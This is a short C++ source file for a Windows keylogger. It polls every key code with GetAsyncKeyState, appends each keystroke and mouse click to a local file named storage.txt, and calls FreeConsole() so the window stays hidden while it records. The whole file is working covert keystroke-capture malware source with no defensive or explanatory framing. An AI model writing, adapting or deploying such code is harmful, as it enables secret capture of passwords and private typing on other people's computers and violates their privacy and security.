//ASCII CHARACTER definitions are available at asciitable.com
//VIRTUAL KEY CODE definitions are available at https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
using namespace std;

int Store(int key, const char *file) {
	cout << key << endl; //S
	FILE *OUTPUT_FILE; //S
	OUTPUT_FILE = fopen(file, "a+"); //S
	if (key == VK_SHIFT) {
		fprintf(OUTPUT_FILE, "%s", "(Shift)");
	}
	else if (key == VK_BACK) {
		fprintf(OUTPUT_FILE, "%s", "(Backspace)");
	}
	else if (key == VK_LBUTTON) {
		fprintf(OUTPUT_FILE, "%s", "(Leftclick)");
	}
	else if (key == VK_RBUTTON) {
		fprintf(OUTPUT_FILE, "%s", "(Rightclick)");
	}
	else if (key == VK_RETURN) {
		fprintf(OUTPUT_FILE, "%s", "(Enter)");
	}
	else if (key == VK_ESCAPE) {
		fprintf(OUTPUT_FILE, "%s", "(ESC)");
	}
	else if (key == VK_SPACE) {
		fprintf(OUTPUT_FILE, "%s", " ");
	}
	else if (key == VK_TAB) {
		fprintf(OUTPUT_FILE, "%s", "(Tab)");
	}
	else if (key == VK_CONTROL) {
		fprintf(OUTPUT_FILE, "%s", "(Ctrl)");
	}
	else
	fprintf(OUTPUT_FILE, "%s", &key); //S
	fclose(OUTPUT_FILE); //S

	return 0;
}

int main() {

	FreeConsole(); //Hides window, REMOVE THIS IF EXECUTABLE IS SHARED

	char i;
	bool OnGoing{ true };
	while (OnGoing == true) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) /*OnButtonDown if statement*/ {
				Store(i, "storage.txt");
			} 
		}
	}
	return 0;
}

